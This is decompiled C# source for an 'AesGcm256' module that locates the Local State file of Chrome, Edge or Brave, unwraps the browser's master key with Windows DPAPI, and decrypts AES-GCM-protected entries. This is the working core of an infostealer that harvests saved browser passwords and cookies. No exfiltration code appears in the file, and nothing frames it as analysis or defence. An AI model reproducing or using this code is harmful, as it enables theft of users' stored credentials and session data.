using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Modules
{
	// Token: 0x02000017 RID: 23
	[global::System.Runtime.CompilerServices.NullableContext(1)]
	[global::System.Runtime.CompilerServices.Nullable(0)]
	internal class AesGcm256
	{
		// Token: 0x06000030 RID: 48 RVA: 0x00003EC0 File Offset: 0x000020C0
		public static byte[] GetKey(string A_0)
		{
			string text = "";
			if (A_0.Contains("Brave-Browser"))
			{
				text = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
			}
			else if (A_0.Contains("Chrome"))
			{
				text = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
			}
			else if (A_0.Contains("Edge"))
			{
				text = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
			}
			object obj = JsonConvert.DeserializeObject(File.ReadAllText(text));
			if (AesGcm256.<>o__0.<>p__2 == null)
			{
				AesGcm256.<>o__0.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(AesGcm256)));
			}
			Func<CallSite, object, string> target = AesGcm256.<>o__0.<>p__2.Target;
			CallSite <>p__ = AesGcm256.<>o__0.<>p__2;
			object obj2 = obj;
			object obj3;
			if (obj2 == null)
			{
				obj3 = null;
			}
			else
			{
				if (AesGcm256.<>o__0.<>p__1 == null)
				{
					AesGcm256.<>o__0.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(AesGcm256), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				Func<CallSite, object, object> target2 = AesGcm256.<>o__0.<>p__1.Target;
				CallSite <>p__2 = AesGcm256.<>o__0.<>p__1;
				if (AesGcm256.<>o__0.<>p__0 == null)
				{
					AesGcm256.<>o__0.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(AesGcm256), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				obj3 = target2(<>p__2, AesGcm256.<>o__0.<>p__0.Target(AesGcm256.<>o__0.<>p__0, obj2));
			}
			return ProtectedData.Unprotect(Convert.FromBase64String(target(<>p__, obj3)).Skip(5).ToArray<byte>(), null, DataProtectionScope.CurrentUser);
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00004040 File Offset: 0x00002240
		public static string decrypt(byte[] A_0, byte[] A_1, byte[] A_2)
		{
			string text = string.Empty;
			try
			{
				GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
				AeadParameters aeadParameters = new AeadParameters(new KeyParameter(A_1), 128, A_2, null);
				gcmBlockCipher.Init(false, aeadParameters);
				byte[] array = new byte[gcmBlockCipher.GetOutputSize(A_0.Length)];
				int num = gcmBlockCipher.ProcessBytes(A_0, 0, A_0.Length, array, 0);
				gcmBlockCipher.DoFinal(array, num);
				text = Encoding.UTF8.GetString(array).TrimEnd("\r\n\0".ToCharArray());
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
				Console.WriteLine(ex.StackTrace);
			}
			return text;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000040E4 File Offset: 0x000022E4
		public static void prepare(byte[] A_0, out byte[] A_1, out byte[] A_2)
		{
			A_1 = new byte[12];
			A_2 = new byte[A_0.Length - 3 - A_1.Length];
			Array.Copy(A_0, 3, A_1, 0, A_1.Length);
			Array.Copy(A_0, 3 + A_1.Length, A_2, 0, A_2.Length);
		}
	}
}
